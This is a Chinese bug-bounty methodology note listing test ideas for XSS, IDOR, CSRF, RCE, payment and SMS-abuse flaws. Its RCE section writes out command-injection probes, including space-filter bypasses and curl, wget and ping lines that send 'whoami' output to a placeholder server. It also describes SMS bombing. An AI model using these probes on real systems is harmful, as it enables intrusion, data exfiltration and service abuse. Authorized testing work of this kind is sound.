# 一、SRC项目漏洞挖掘思路

## （一）XSS漏洞思路

1. XSS漏洞即跨站脚本攻击，是指攻击者利用web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（JavaScript、ActionScript、VBScript等）当信任此web服务器的用户访问web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码。

3. **存储型XSS**

- 当HTML编辑器可以解析HTML语言并且可以保存时，可能存在存储型XSS漏洞

- 当该编辑器可以修改文件名时，可以尝试在文件名中插入XSS，或修改文件名后缀尝试获取shell

- 当self-xss可以通过分享等功能分享给其他用户时，可以获取其他用户的cookie，从而提升危害  

## （二）其他漏洞思路

1. **SQL注入**。数据包中存在与数据交互的参数，在参数后面加上单双引号等特殊符号测试是否存在输入。

2. **逻辑漏洞**。验证手机号码的参数中，可以尝试使用逗号分隔增加另一个手机号码，如phone=手机1,手机2，看是否会同时发送给两台手机，如果可以则可以利用该漏洞同时发送上万甚至更多手机，相当于拒绝服务攻击。

3. **越权漏洞**。看到id参数可以测试越权，开两个账户，把id替换成另一个账户未公开的id，若成功发送到另一个账户上，则可以越权查看其他用户的相关数据了

4. **重放或并发**。发送短信这个功能点，可以重放数据包或并发数据表，达到短信轰炸的效果。

## （三）IDOR漏洞思路

1. 应用程序中可能存在许多变量如id、pid、uid等，虽然这些值通常被视为http参数，但它们可以在header和cookie中被找到。攻击者可以通过更改这些变量的值来访问，编辑或删除任何其他用户的对象，此漏洞称为IDOR（不安全的直接对象引用），俗称越权漏洞。

2. **越权修改**。

	-  若文件名是由文件id来控制的，那可以尝试修改他人的文件id对其文件进行重命名

	- 若参数中存在人员类型，可以修改人员类型就行越权遍历，如修改student为teacher

3. **越权下载**。若文件是由文件id控制，当我们下载文件时需要知道文件id，我们可以通过修改成他人的文件id进行下载，若路径可控则可以尝试任意文件下载。

4. **越权删除**。与越权下载同理。

5. **越权**。前三个是由文件id控制，那么增加html、css文件、图像文件、版本历史那就是由项目id进行控制，这几个功能可以尝试修改项目id测试越权。

## （四）CSRF漏洞思路

1. CSRF跨站请求伪造，指攻击者引诱用户访问攻击者构造的网站，在攻击者的网站中使用用户的登录状态发起跨站请求。

2. 思路：  

	- 修改密码：若修改密码处没有旧密码验证，则可能存在csrf漏洞

	- 寻找有id、pid此类参数的地方

3. 演示：站长之家“大米商城damishop v3.9.5”

## （五）RCE漏洞思路  

1. 远程代码执行RCE使攻击者能够通过注入攻击执行恶意代码。代码注入攻击与命令注入攻击不同。攻击者的成果取决于服务器端的限制，攻击者可能能够从代码注入升级为命令注入。远程代码攻击者可能会完全破坏易受攻击的web应用程序及web服务器。几乎每种编程语言都存在代码执行函数。

2. 黑盒测试常见方法  

	- windows下的||和&

	- linux下的||、&和;

	- linux下过滤空格可以使用以下方式
	```shell

	${IFS}

	$IFS

	$IFS$9

	```

	- json格式下的测试
	```http

	\u0000awget\u0020 http://服务器地址

```

	- linux下可以包括反引号，windows不可以

	- linux下正常测试rce
	```shell

	curl http://服务器地址/`whoami`

	ping `whoami`.服务器地址

```
	- windows系统与linux系统rce
	
		-  winddows：ping&dir 当ping执行完后执行dir命令

		- linux：dir;ping不管前面命令对不对都会执行ping，正确的命令都会执行，不正确的跳过

3. 黑盒测试重点关注的参数，常见的容易导致命令执行的参数，可以利用参数拼接进行测试
```shell

exec={payload} payload={payload} command={payload} run={payload}

execute={payload} print={payload} ping={payload} email={payload}

include={payload} id={payload} exclude={payload} username={payload}

jump={payload} user={payload} code={payload} to={payload}

reg={payload} from={payload} do={payload} search={payload}

func={payload} query={payload} arg={payload} q={payload}

option={payload} s={payload} load={payload} shopld={payload}

process={payload} blogld={payload} step={payload} phone={payload}

read={payload} mode={payload} function={payload} next={payload}

req={payload} firstname={payload} feature={payload} lastname={payload}

exe={payload} locale={payload} module={payload} cmd={payload}

system={payload} sys={payload}

```

4. 文件上传有重命名时，通过name参数进行rename的要想到是不是调用cmd进行rename，可以尝试拼接测试rc

5. 案例。

	- 数组可控导致rce（http://xz.aliyun.com/t/10391）。可上传文件名被带入数据包中，后端将文件名以数组的方式进行控制，将可上传文件名加入php即可上传webshell，还可以利用插入闭合数组进行getshell

	- 播放文件导致rce。一般这种返回的音频文件格式，但是如果返回ok说明是一个接口，则后端很可能是在读取该文件，可以测试拼接命令

## （六）CSRF思路

1. 若数据包中存在图片路径参数可控，则可以尝试替换图片路径，可以尝试将路径替换为退出功能的接口，提升危害

## （七）支付漏洞

1. 一般充值数值是精确到分，将最后一位四舍五入，我们可以将数值精确到更后一位，将充值0.02改为0.019，若能充值，则存在支付漏洞

2. 购物一般是数量*单价，如果控制不了单价，可以尝试控制数量，将整数改为小数，若可以支付，则存在漏洞

## （八）URL跳转

1. 页面中存在url跳转参数的地方，看到这种参数可以测试ssrf或url跳转

## （九）无限调用

1. 互联网产商都有一些付费服务，部分开放测试，可以测试无限调用接口，若没有限制则不需要付费另外购买了，若能远程检测图片，说明服务器可以访问外网，还可以测试ssrf